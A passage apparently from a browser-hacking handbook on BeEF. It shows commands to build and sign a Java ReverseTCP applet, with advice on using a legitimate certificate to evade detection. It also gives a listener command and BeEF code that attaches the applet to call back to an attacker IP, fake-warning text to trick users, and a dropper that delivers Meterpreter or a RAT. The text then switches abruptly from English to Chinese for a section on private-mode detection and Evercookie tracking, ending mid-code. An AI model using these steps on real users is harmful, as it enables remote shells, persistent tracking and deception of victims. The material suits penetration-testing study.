
This command will build the `Applet_ReverseTCP.jar` file. Before you can push it out to the victim, you need to sign it. For demonstration reasons, you can self-sign the JAR file. However, as mentioned earlier, to reduce the likelihood of detection this can be signed with a legitimate certificate too. To self-sign the JAR, execute the following from the command line, which will create the keyfile as specified:

```
keytool -keystore <keyfile> -genkey
```

```
jarsigner -keystore <keyfile> Applet_ReverseTCP.jar mykey
```

Once the applet executes on the target’s computer, it will attempt to connect back to your machine. Therefore, it’s important to remember to start your listener before you execute this payload against the target. To start the listener, execute the following from the command line:

```
java -cp JavaPayload.jar javapayload.handler.stager.\StagerHandler ReverseTCP <Listening IP>\
<Listening TCP Port> -- JSh
```

The “Java Applet” module relies on BeEF’s `beef.dom.attachApplet()` function, which for brevity we have not shown here, but you can review at [`https://browserhacker.com`](https://browserhacker.com). The JavaScript code required to attach the earlier-created applet would be something similar to this:

```
beef.dom.attachApplet(applet_id,
  applet_name,
  'javapayload.loader.AppletLoader',
  null,
  applet_archive,
  [{'argc':'5',
    'arg0':'ReverseTCP',
    'arg1':attacker_ip,
    'arg2':attacker_port,
    'arg3':'--',
    'arg4':'JSh'}]
);
```

The function uses the following configuration options:

* `applet_id`—A random applet identifier.
* `applet_name`—A random applet name; there’s nothing stopping this from being something such as “Microsoft.”
* `applet_archive`—The URL to the `Applet_ReverseTCP.jar` constructed earlier.
* `attacker_ip`—The IP address of the listening service.
* `attacker_port`—The TCP port of the listening service.

To truly optimize this attack, especially in light of Java dialog boxes that may appear, it’s worth performing these attacks with additional fraudulent content defacements or other social-engineering tricks. This may be as simple as displaying a fake notification to the user stating, “We apologize, but due to changes in our website configuration you may receive an applet warning dialog, this is expected and must be accepted, otherwise content will not be available.”

start feature 

* * *

**Signed Applet Dropper** If JavaPayload doesn’t suit your needs, then use BeEF’s “Signed Applet Dropper” module. It works in a similar way to the “Firefox Extension Dropper.” The difference is that when the target user allows the signed applet to run (if signed with an untrusted code signing certificate), the applet will download the dropper dynamically and execute it. The dropper is then deleted after execution. The dropper can easily be a binary with a Meterpreter backdoor, which connects back to a reverse handler via an HTTPS or DNS communication channel. You don’t have to use Meterpreter; you can use any Remote Access Tool (RAT) of choice. Targeting Internet Explorer can achieve the best results because, at the time of this writing, it lacked a complete Click to Play implementation. 

* * *

 end feature 

Once executed, the target will connect back to your Java listener, and the terminal should respond by displaying a “!” character. From there, you can type `help` to display a list of commands (see `Figure 5-26`), such as `ls`, that will list the contents of the current folder (as shown in `Figure 5-27`). You will further explore remote code execution, particularly as executed through exploiting plugins, in Chapter 8. Of course, once this level of access is acquired on a target’s machine, there’s nothing preventing you from executing any commands you like.

start figure 

**Figure 5-26:** Java Payload help command

![c05f026.tif](img/c05f026.png)

 end figure  start figure 

**Figure 5-27:** Java Payload ls command

![c05f027.tif](img/c05f027.png)

 end figure 

For the full module code listing, don’t forget to visit [`https://browserhacker.com`](https://browserhacker.com) or the Wiley website at: [www.wiley.com/go/browserhackershandbook](http://www.wiley.com/go/browserhackershandbook).

start feature 

* * *

**BeEF’s Fake Notification Module** A number of quick-and-dirty modules exist within BeEF to display various notification bars, impersonating Internet Explorer 8, Firefox and Chrome notification bars. The “Fake Notification Bar (IE)” module can be used in a pinch and simply requires the attacker to specify the notification text. This is demonstrated in `Figure 5-28`. start figure  

**Figure 5-28:** BeEF’s Fake Notification Bar (IE) module in action

![c05f028.tif](img/c05f028.png) end figure  

* **

 end feature 

As you have learned in this section, the number of ways in which a user’s trust can be broken is fairly extensive. Indeed, these techniques are in no way meant to represent every single trick available up a penetration tester’s sleeve. What’s also important to note from this section is that a number of these techniques branch out of the pure social engineering space. In fact, many of these examples are implemented through a layered approach, where a degree of social engineering is applied to then take further advantage of a technical problem within browsers or their various augmentations.

# Privacy Attacks

When web browsers first started to become popular, there wasn’t much thought put into the concept of maintaining a user’s privacy. Over time, as the number of web applications increased, particularly those dealing with potentially personal information, this started to change. Most modern browsers are quite conscious of keeping their users’ information private; some have even gone so far as to offer private browsing modes. The feature is known by many different names on different browsers, such as:

* Chrome’s Incognito mode
* Internet Explorer’s InPrivate browsing
* Opera’s Private tab or window
* Firefox’s Private browsing
* Safari’s Private browsing

Browsers in private mode will often have some part of the user interface modified to represent the change in mode. `Figure 5-29` demonstrates how Chrome distinguishes between normal and Incognito mode.

start figure 

**Figure 5-29:** Chrome’s Incognito mode

![c05f029.eps](img/c05f029.png)

end figure 

截至本文撰写时，仍不存在一种简单方法可以检测浏览器是否处于隐私模式。早期由 Jeremiah Grossman29 和 Collin Jackson30 进行的研究表明，较旧的浏览器版本（如 Firefox 1.5/2.0）可能会泄露它们是否处于隐私模式。研究人员通过 JavaScript `getComputedStyle` 函数（如第 4 章“利用浏览器历史记录”部分所述）来实现这一点。

仅需知道请求服务器的源 IP 地址，就能确定客户端的地理位置，如果不是区域层面，至少可以确定到国家边界内。

这并不意味着隐私在其他地方不受重视。例如，Electronic Frontier Foundation（EFF）一直在前线维护人们的隐私、自由言论以及其他消费者权利。另一个旨在保护在线匿名性的项目是 Tor 项目，最初称为 The Onion Router 项目。

在本节的其余部分，您将更详细地探索 Tor 网络，并了解一些可以用于绕过浏览器中已有的隐私机制的技巧。

## 非 Cookie 会话跟踪

尽管本节可能不如偷窥无辜目标的网络摄像头那样吸引人，但跟踪用户在 Internet 上的浏览行为同样有用。在第 4 章中，您已经获得了关于浏览器历史记录的大量信息，请参考该章节以获取更多此类信息泄露的背景。

当人们讨论跟踪浏览器会话时，通常指的是 Cookie 作为主要技术。您可以在第 6 章“绕过 Cookie 防护”部分了解更多关于 Cookie 的内容。

如果用户清除了 Cookie，或者针对特定站点禁用了 Cookie，在这种情况下，Cookie 单独无法用于跨多个站点或访问进行用户跟踪。

为使不可破坏的 Cookie 更可行，Samy Kamkar（第 2 章中讨论的著名 Samy 蠕虫作者）提出了 Evercookie。Evercookie 通过 [`samy.pl/evercookie/`](http://samy.pl/evercookie/) 获取，采用多层次方式存储可提取的会话标识符。它不单纯依赖普通 HTTP Cookie，而是利用多种其他 artifact，包括：

* 本地共享对象或 Flash Cookie
* Silverlight 存储
* IE userData 存储
* HTML5 存储

为提高框架返回浏览器会话可识别的可能性，BeEF 会话 JavaScript 库使用 Evercookie JavaScript 库。这一点在 BeEF 的 `get_hook_session_id()` 函数中可见，该函数查询三种 Evercookie artifact：cookie、userdata、window data：

```javascript
//Create the evercookie object first
ec: new evercookie(), 
get_hook_session_id: function() {
  // check if the browser is already known to the framework
  var id = this.ec.evercookie_cookie("BEEFHOOK");
  if (typeof id == 'undefined') {
    var id = this.ec.evercookie_userdata("BEEFHOOK");
  }
  if (typeof id == 'undefined') {
    var id = this.ec.evercookie_window("BEEFHOOK");
  }
  // if the browser is not known create a hook session id and set it
```
